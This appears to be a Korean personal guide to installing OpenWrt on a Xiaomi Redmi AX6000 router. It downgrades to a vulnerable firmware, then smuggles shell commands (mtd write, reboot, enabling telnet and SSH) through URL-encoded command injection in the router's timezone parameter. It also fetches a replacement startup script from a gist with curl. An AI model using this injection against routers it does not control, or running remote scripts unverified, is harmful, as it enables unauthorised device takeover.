# 홈클라우드 관리하기

# Resources 
> https://openwrt.org/toh/xiaomi/redmi_ax6000

> https://github.com/openwrt/openwrt/pull/11115

# 목표
원래 레드미 펌으로 돌아올 수 있게, Stock Layout 으로 설치함

## 환경
윈도우 10 혹은 11, 추가 기능으로 Telnet을 설치해야 합니다.

## 과정
> 과정은 [링크](https://openwrt.org/toh/xiaomi/redmi_ax6000)에 나와있습니다.
> Arc 님의 [동영상](https://www.youtube.com/watch?v=FI54Evj1HzQ) 자료도 있습니다.

**모든 과정은 해당 공유기에 연결된 기기에서 진행해야 합니다.** 

1. 취약점이 있는 펌웨어 버전을 [다운로드](https://cdn.cnbj1.fds.api.mi-img.com/xiaoqiang/rom/rb06/miwifi_rb06_firmware_847e9_1.0.48.bin) 해줍니다.
2. 해당 버전으로 다운그레이드 해줍니다. (다운그레이드 경고가 나오는데 주소창에서 파라미터를 1에서 2로 수동으로 변경해줘야 합니다.)
3. 재접속하고 토큰값을 얻어서 저장합니다.
```
http://192.168.31.1/cgi-bin/luci/;stok=b0b87a703bca3e945e7c17617c2110ad/web/setting/upgrade
위와 같은 주소라면 b0b87a703bca3e945e7c17617c2110ad 입니다.
```
4. 이제 기기를 루팅해야 합니다. dev/debug 모드로 진입합니다. 진입하는 방법은 아래 링크로 요청하면 되는데, {token}을 바꿔줘야 합니다.
```
http://192.168.31.1/cgi-bin/luci/;stok={token}/api/misystem/set_sys_time?timezone=%20%27%20%3B%20echo%20pVoAAA%3D%3D%20%7C%20base64%20-d%20%7C%20mtd%20write%20-%20crash%20%3B%20

토큰이 b0b87a703bca3e945e7c17617c2110ad 인 경우
http://192.168.31.1/cgi-bin/luci/;stok=b0b87a703bca3e945e7c17617c2110ad/api/misystem/set_sys_time?timezone=%20%27%20%3B%20echo%20pVoAAA%3D%3D%20%7C%20base64%20-d%20%7C%20mtd%20write%20-%20crash%20%3B%20
```
아래와 같은 json 응답을 얻으면 됩니다.
```
{
"code": 0
}
```
5. 재부팅 요청을 넣습니다. 마찬가지로 토큰값을 바꿔주면 됩니다.
```
http://192.168.31.1/cgi-bin/luci/;stok={token}/api/misystem/set_sys_time?timezone=%20%27%20%3b%20reboot%20%3b%20

http://192.168.31.1/cgi-bin/luci/;stok=b0b87a703bca3e945e7c17617c2110ad/api/misystem/set_sys_time?timezone=%20%27%20%3b%20reboot%20%3b%20
```
6. 재부팅이 완료되면, 아래 명령어를 마찬가지로 토큰값을 바꿔 넣어줍니다.
**재부팅 시 토큰값이 달라집니다!**
```
http://192.168.31.1/cgi-bin/luci/;stok={token}/api/misystem/set_sys_time?timezone=%20%27%20%3B%20bdata%20set%20telnet_en%3D1%20%3B%20bdata%20set%20ssh_en%3D1%20%3B%20bdata%20commit%20%3B%20
http://192.168.31.1/cgi-bin/luci/;stok={token}/api/misystem/set_sys_time?timezone=%20%27%20%3b%20reboot%20%3b%20

토큰값이 b0b87a703bca3e945e7c17617c2110ad 이라면...
http://192.168.31.1/cgi-bin/luci/;stok=ca4e0aa091baae02b32750405e202c1a/api/misystem/set_sys_time?timezone=%20%27%20%3B%20bdata%20set%20telnet_en%3D1%20%3B%20bdata%20set%20ssh_en%3D1%20%3B%20bdata%20commit%20%3B%20
http://192.168.31.1/cgi-bin/luci/;stok=ca4e0aa091baae02b32750405e202c1a/api/misystem/set_sys_time?timezone=%20%27%20%3b%20reboot%20%3b%20
```

7. 이제 개발/디버그 모드에서 필요한 처리는 완료되었으므로 개발/디버그 모드를 종료합니다.
**재부팅 시 토큰값이 달라집니다!**
```
http://192.168.31.1/cgi-bin/luci/;stok={token}/api/misystem/set_sys_time?timezone=%20%27%20%3b%20mtd%20erase%20crash%20%3b%20

ea35cc66a60b0def7227cd3f890989a1
```
8. SSH 접속을 허용하기 위해 텔넷으로 공유기에 접속해줍니다.
9. SSH 접속을 불가하게 만드는 라인을 `/etc/init.d/dropbear`에서 삭제합니다.
지워야 하는 라인은 아래와 같습니다.
```
if [ "$flg_ssh" != "1" -o "$channel" = "release" ]; then        
  return 0                                                           
fi
```

vi로 수동으로 삭제하거나, 아래 라인을 입력해서 원본을 지우고 네트워크에서 가져와 넣어주면 됩니다.
```
cd /etc/init.d/ && rm -rf dropbear && curl https://gist.githubusercontent.com/AmirulAndalib/4046f133f66b100d9bf2156dfd84afe8/raw/dropbear >> dropbear && chmod +x dropbear && cd ~
```

10. `/etc/init.d/dropbear start` 으로 데몬을 실행시킵니다.
11. root 계정의 비밀번호를 설정해줘야 SSH 연결이 가능해집니다. `passwd` 명령어로 비밀번호를 설정해주세요. 
11. 인스톨할 파일을 미리 복사해둡시다. 먼저 이미지를 다운받습니다.
    https://firmware-selector.openwrt.org/ 에서 ax6000 검색해서 다운받으면 됩니다.
    **stock layout으로 검색해야 합니다.**
    INITRAMFS-FACTORY.UBI, SYSUPGRADE 모두 다운받으면 됩니다.
12. 해당 파일을 다운로드 받은 곳에서 cmd나 powershell 등을 열어서 `scp` 명령어로 복사해줍니다.
아래 명령어에서 버전만 바꿔주면 됩니다.
```
scp ./openwrt-{version}-mediatek-filogic-xiaomi_redmi-router-ax6000-stock-initramfs-factory.ubi root@192.168.31.1:/tmp
scp {복사할파일} {대상:/경로}

저는 23.05.4 를 이용했습니다.
scp ./openwrt-23.05.4-mediatek-filogic-xiaomi_redmi-router-ax6000-stock-initramfs-factory.ubi root@192.168.31.1:/tmp
```
잘 되었다면 이렇게 나와야 합니다.
```
PS C:\Users\jh\Downloads> scp ./openwrt-23.05.4-mediatek-filogic-xiaomi_redmi-router-ax6000-stock-initramfs-factory.ubi root@192.168.31.1:/tmp
root@192.168.31.1's password:
openwrt-23.05.4-mediatek-filogic-xiaomi_redmi-router-ax6000-stock-initramfs-factory.ubi 100% 8320KB   9.6MB/s   00:00
```

12. 이제 OpenWRT를 설치할건데, `cat /proc/cmdline` 으로 현재 스톡 시스템을 확인해줍니다.
이건 매번 다르게 나올 수 있습니다. 중요한 건 firmware 값이 0이냐 1이냐 입니다.
```
root@XiaoQiang:~# cat /proc/cmdline
console=ttyS0,115200n1 loglevel=8 firmware=1 factory_mode=1 uart_en=1
```
펌웨어 값이 0인 경우: 현재 시스템이 `ubi0`입니다.
펌웨어 값이 1인 경우: 현재 시스템이 `ubi1`입니다.

12. 펌웨어 값에 따라 설치를 위해 nvram을 다르게 세팅해줍니다.
```
# if firmware == 1, use this
nvram set boot_wait=on
nvram set uart_en=1
nvram set flag_boot_rootfs=0
nvram set flag_last_success=0
nvram set flag_boot_success=1
nvram set flag_try_sys1_failed=0
nvram set flag_try_sys2_failed=0
nvram commit
```

```
# if firmware == 0, use this
nvram set boot_wait=on
nvram set uart_en=1
nvram set flag_boot_rootfs=1
nvram set flag_last_success=1
nvram set flag_boot_success=1
nvram set flag_try_sys1_failed=0
nvram set flag_try_sys2_failed=0
nvram commit
```

13. 펌웨어에 따라 플래싱 명령어를 입력해줍니다.
```
FIRMWARE 1인 경우, 아래 라인에서 SCP로 복사해온 파일 버전에 맞게 바꿔주세요.
ubiformat /dev/mtd8 -y -f /tmp/openwrt-{version}-mediatek-filogic-xiaomi_redmi-router-ax6000-stock-initramfs-factory.ubi

예시
ubiformat /dev/mtd8 -y -f /tmp/openwrt-23.05.4-mediatek-filogic-xiaomi_redmi-router-ax6000-stock-initramfs-factory.ubi

FIRMWARE 0인 경우, 아래 라인에서 SCP로 복사해온 파일 버전에 맞게 바꿔주세요.
ubiformat /dev/mtd9 -y -f /tmp/openwrt-{version}-mediatek-filogic-xiaomi_redmi-router-ax6000-stock-initramfs-factory.ubi
```

플래싱이 진행되고 아래와 같은 라인을 보면 성공입니다.
```
root@XiaoQiang:/tmp# ubiformat /dev/mtd8 -y -f /tmp/openwrt-23.05.4-mediatek-filogic-xiaomi_redmi-router-ax6000-stock-initramfs-factory.ubi
ubiformat: mtd8 (nand), size 31457280 bytes (30.0 MiB), 240 eraseblocks of 131072 bytes (128.0 KiB), min. I/O size 2048 bytes
libscan: scanning eraseblock 239 -- 100 % complete
ubiformat: 240 eraseblocks have valid erase counter, mean value is 0
ubiformat: flashing eraseblock 64 -- 100 % complete
ubiformat: formatting eraseblock 239 -- 100 % complete
```
14. 공유기를 재부팅시킵니다. 텔넷연결에서 reboot 해주시면 됩니다.
15. 환경변수를 설정해줍니다.
16. SYSUPGRADE를 플래싱 해줍니다.
```
sysupgrade -n /tmp/openwrt-{version}-mediatek-filogic-xiaomi_redmi-router-ax6000-stock-squashfs-sysupgrade.bin
sysupgrade -n /tmp/openwrt-23.05.4-mediatek-filogic-xiaomi_redmi-router-ax6000-stock-squashfs-sysupgrade.bin
```
